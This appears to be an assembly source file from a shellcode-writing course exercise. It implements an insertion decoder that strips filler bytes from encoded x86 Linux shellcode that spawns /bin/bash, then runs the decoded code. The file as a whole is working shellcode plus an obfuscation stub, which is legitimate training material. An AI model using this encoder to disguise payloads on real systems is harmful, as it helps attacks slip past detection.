; Filename: InsertionDecoder.nasm
; Author:   Jake Badman
; Website:  14deep.github.io
; Purpose:  An insertion decoder to decode the shellcode for exercise 4 of SLAE 

global _start			

section .text
_start:

;Will be using jmp, call, pop to get the address of the encoded shellcode. 


jmp short shellcode                  ; jumping to call_shellcode, which holds the encoded shellcode

decoder:

	pop esi                      ; pop address of Shellcode into esi
	lea edi, [esi +1]            ; this is tracking the inserted values, edi will contain the value after esi, which is the inserted value
	xor eax, eax
	mov al, 1                    ; move 1 to eax, used as a counter for inserted values
	xor ebx, ebx

decode:
	mov bl, byte [esi + eax]     ; bl will point to the first inserted value
	xor bl, 0x10                   ; check if there is still shellcode to decode
	jnz short EncodedShellcode   ; if the zero flag is not set it means that the xor'd value wasn't the same as the inserted value meaning
				     ; the shellcode has finished. 

	mov bl, byte [esi + eax + 1]
	
	mov byte [edi], bl	     ; move bl into pointer to edi to start the next iteration of decoding

	inc edi			     ; increment edi so that it points to the next inserted value
	add al, 0x2

	jmp short decode             ; loop until all shellcode has been decoded


shellcode:

	call decoder
	EncodedShellcode: db 0x31,0x10,0xc0,0x10,0x50,0x10,0x68,0x10,0x62,0x10,0x61,0x10,0x73,0x10,0x68,0x10,0x68,0x10,0x62,0x10,0x69,0x10,0x6e,0x10,0x2f,0x10,0x68,0x10,0x2f,0x10,0x2f,0x10,0x2f,0x10,0x2f,0x10,0x89,0x10,0xe3,0x10,0x50,0x10,0x89,0x10,0xe2,0x10,0x53,0x10,0x89,0x10,0xe1,0x10,0xb0,0x10,0x0b,0x10,0xcd,0x10,0x80,0x10,0xaa,0xaa
